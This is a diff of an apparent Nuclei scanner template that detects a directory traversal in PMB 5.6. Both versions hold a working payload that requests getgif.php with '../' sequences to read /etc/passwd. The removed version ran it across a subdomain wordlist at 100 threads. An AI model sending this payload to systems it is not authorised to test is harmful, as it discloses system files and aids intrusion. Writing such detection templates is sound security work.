@@ -1,30 +1,27 @@
-id: pmb-directory-traversal 1
+id: pmb-directory-traversal
+
 info:
-  author: geeknik
-  description: The PMB Gif Image is not sanitizing the 'chemin', which leads to Local
-    File Disclosure.
   name: PMB 5.6 Directory Traversal
-  reference: https://packetstormsecurity.com/files/160072/PMB-5.6-Local-File-Disclosure-Directory-Traversal.html
+  author: geeknik
   severity: medium
+  description: The PMB Gif Image is not sanitizing the content of the 'chemin' parameter, this can in turn be used to a Local File Disclosure.
+  reference: https://packetstormsecurity.com/files/160072/PMB-5.6-Local-File-Disclosure-Directory-Traversal.html
   tags: lfi
-requests:
-- attack: sniper
-  matchers:
-  - regex:
-    - 'root:[x*]:0:0:'
-    type: regex
-  - status:
-    - 200
-    type: status
-  matchers-condition: and
-  payloads:
-    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-  raw:
-  - 'GET /opac_css/getgif.php?chemin=../../../../../../etc/passwd&nomgif=tarik HTTP/1.1
 
-    Host: {{Subdomains}}
 
-    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/opac_css/getgif.php?chemin=../../../../../../etc/passwd&nomgif=tarik"
+      - "{{BaseURL}}/pmb/opac_css/getgif.php?chemin=../../../../../../etc/passwd&nomgif=tarik"
 
-    '
-  threads: 100
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0"
+
+      - type: status
+        status:
+          - 200
